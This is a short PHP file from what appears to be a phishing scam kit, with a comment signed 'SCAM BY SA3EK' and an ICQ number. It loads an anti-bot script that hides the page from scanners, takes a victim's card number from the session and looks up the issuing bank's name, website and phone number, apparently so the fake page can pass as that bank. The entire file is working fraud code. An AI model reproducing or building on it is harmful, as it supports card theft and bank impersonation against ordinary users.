<?php
    session_start();
    error_reporting(E_ERROR | E_PARSE);
    /******
    SCAM BY SA3EK
    ICQ : 740900705
    *******/
    include('../antibots/bot.php');
    
    if(isset($_SESSION['xyscardnumberx'])){
        $bin = $_SESSION['xyscardnumberx'];
        $bin = substr(str_replace(' ', '', $bin), 0, 8);
        $jsonArray = @json_decode(file_get_contents("https://lookup.binlist.net/" . $bin));
        $bankName  = $jsonArray->bank->name;
        $bankUrl   = $jsonArray->bank->url;
        $bankPhone = $jsonArray->bank->phone;
    }
?>